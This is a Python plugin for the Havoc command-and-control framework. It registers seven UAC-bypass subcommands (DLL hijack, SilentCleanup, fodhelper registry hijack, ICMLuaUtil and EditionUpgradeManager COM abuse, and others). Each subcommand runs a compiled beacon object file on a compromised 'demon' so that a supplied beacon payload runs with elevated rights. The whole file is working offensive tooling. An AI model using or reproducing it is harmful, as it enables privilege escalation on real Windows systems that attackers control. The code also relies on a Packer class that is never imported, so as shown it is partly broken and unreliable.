"""
UacBonanza
----------
Havoc wrapper for icyguider/UAC-BOF-Bonanza. Vendored source lives at
client/Modules/UacBonanza/repo/ (force-added to the top Havoc repo so a
plain `git clone` brings it down without --recurse-submodules).

Compiled by the top-level `makefile` bof-build target, which invokes
`make -C client/Modules/UacBonanza/repo bof` (the shipped Makefile).
The vendored EditionUpgradeManager source needed three small fixes
(void go, cast) to compile on modern GCC — see git log.

Uses the shared Packer from client/Modules/Packer/packer.py; the
inline Packer class in the upstream Havoc-UACBypass.py is dropped
here so there is one source of truth.

Every bypass is x64-only — upstream never shipped x86 BOFs.
"""

from havoc import Demon, RegisterCommand, RegisterModule


def _read_file_bytes(demon, path):
    try:
        with open(path, "rb") as fh:
            return fh.read()
    except OSError as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           f"Failed to read local file '{path}': {e}")
        return None


def _arch_ok(demon):
    if demon.ProcessArch == "x86":
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "UacBonanza bypasses are x64-only")
        return False
    return True


# --------------------------------------------------------------- trustedpath
def run_trustedpath(demonID, *params):
    demon = Demon(demonID)
    if not _arch_ok(demon):
        return False
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Usage: uac-bypass trustedpath <local_dll>")
        return False
    data = _read_file_bytes(demon, params[0])
    if data is None:
        return False

    packer = Packer()
    packer.adduint32(len(data))
    packer.addstr(data)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"UAC bypass: TrustedPathDLLHijack (dll={params[0]}, {len(data)} bytes)")
    demon.InlineExecute(TaskID, "go",
        "repo/TrustedPathDLLHijack/bin/TrustedPathDLLHijackBOF.o",
        packer.getbuffer(), False)
    return TaskID


# --------------------------------------------------------------- silentcleanup
def run_silentcleanup(demonID, *params):
    demon = Demon(demonID)
    if not _arch_ok(demon):
        return False
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Usage: uac-bypass silentcleanup <local_exe>")
        return False
    data = _read_file_bytes(demon, params[0])
    if data is None:
        return False

    packer = Packer()
    packer.adduint32(len(data))
    packer.addstr(data)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"UAC bypass: SilentCleanupWinDir (exe={params[0]}, {len(data)} bytes)")
    demon.InlineExecute(TaskID, "go",
        "repo/SilentCleanupWinDir/bin/SilentCleanupWinDirBOF.o",
        packer.getbuffer(), False)
    return TaskID


# --------------------------------------------------------------- sspidatagram
def run_sspi(demonID, *params):
    demon = Demon(demonID)
    if not _arch_ok(demon):
        return False
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Usage: uac-bypass sspidatagram <remote_file_to_execute>")
        return False

    packer = Packer()
    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"UAC bypass: SSPI Datagram Contexts (target={params[0]})")
    demon.InlineExecute(TaskID, "go",
        "repo/SspiUacBypass/bin/SspiUacBypassBOF.o",
        packer.getbuffer(), False)
    return TaskID


# --------------------------------------------------------------- registrycommand
def run_registrycommand(demonID, *params):
    demon = Demon(demonID)
    if not _arch_ok(demon):
        return False
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Usage: uac-bypass registrycommand <remote_file_to_execute>")
        return False

    packer = Packer()
    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"UAC bypass: ms-settings\\Shell\\Open\\command hijack (target={params[0]})")
    demon.InlineExecute(TaskID, "go",
        "repo/RegistryShellCommand/bin/RegistryShellCommandBOF.o",
        packer.getbuffer(), False)
    return TaskID


# --------------------------------------------------------------- elevatedcom
def run_elevatedcom(demonID, *params):
    demon = Demon(demonID)
    if not _arch_ok(demon):
        return False
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Usage: uac-bypass elevatedcom <remote_file_to_execute>")
        return False

    packer = Packer()
    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"UAC bypass: ICMLuaUtil elevated COM (target={params[0]})")
    demon.InlineExecute(TaskID, "go",
        "repo/CmstpElevatedCOM/bin/CmstpElevatedCOMBOF.o",
        packer.getbuffer(), False)
    return TaskID


# --------------------------------------------------------------- colordataproxy
def run_colordataproxy(demonID, *params):
    demon = Demon(demonID)
    if not _arch_ok(demon):
        return False
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Usage: uac-bypass colordataproxy <remote_file_to_execute>")
        return False

    packer = Packer()
    packer.addstr(params[0])

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"UAC bypass: ColorDataProxy + ICMLuaUtil (target={params[0]})")
    demon.InlineExecute(TaskID, "go",
        "repo/ColorDataProxy/bin/ColorDataProxyBOF.o",
        packer.getbuffer(), False)
    return TaskID


# --------------------------------------------------------------- editionupgrade
def run_editionupgrade(demonID, *params):
    demon = Demon(demonID)
    if not _arch_ok(demon):
        return False
    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           "Usage: uac-bypass editionupgrade <local_exe>")
        return False
    data = _read_file_bytes(demon, params[0])
    if data is None:
        return False

    packer = Packer()
    packer.adduint32(len(data))
    packer.addstr(data)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        f"UAC bypass: IEditionUpgradeManager COM (exe={params[0]}, {len(data)} bytes)")
    demon.InlineExecute(TaskID, "go",
        "repo/EditionUpgradeManager/bin/EditionUpgradeManagerBOF.o",
        packer.getbuffer(), False)
    return TaskID


# =========================================================================
# Registrations — each command lives under the "uac-bypass" subcommand group
# =========================================================================
RegisterModule("uac-bypass", "UAC bypass BOFs from icyguider/UAC-BOF-Bonanza",
               "", "[subcommand] (args)", "", "")

RegisterCommand(run_trustedpath,      "uac-bypass", "trustedpath",
    "Fake C:\\Windows\\ directory + ComputerDefaults.exe + Secur32.dll",
    0, "<local_dll>",                    "/root/beacon.dll")

RegisterCommand(run_silentcleanup,    "uac-bypass", "silentcleanup",
    "Environment\\windir + SilentCleanup scheduled task",
    0, "<local_exe>",                    "/root/beacon.exe")

RegisterCommand(run_sspi,             "uac-bypass", "sspidatagram",
    "SSPI Datagram Contexts",
    0, "<remote_file_to_execute>",       "C:\\Users\\bob\\Desktop\\beacon.exe")

RegisterCommand(run_registrycommand,  "uac-bypass", "registrycommand",
    "Modify ms-settings\\Shell\\Open\\command + trigger fodhelper.exe",
    0, "<remote_file_to_execute>",       "C:\\Users\\bob\\Desktop\\beacon.exe")

RegisterCommand(run_elevatedcom,      "uac-bypass", "elevatedcom",
    "ICMLuaUtil elevated COM interface (cmstp.exe auto-elevate abuse)",
    0, "<remote_file_to_execute>",       "C:\\Users\\bob\\Desktop\\beacon.exe")

RegisterCommand(run_colordataproxy,   "uac-bypass", "colordataproxy",
    "ColorDataProxy + ICMLuaUtil elevated COM",
    0, "<remote_file_to_execute>",       "C:\\Users\\bob\\Desktop\\beacon.exe")

RegisterCommand(run_editionupgrade,   "uac-bypass", "editionupgrade",
    "IEditionUpgradeManager elevated COM + Environment\\windir hijack",
    0, "<local_exe>",                    "/root/beacon.exe")
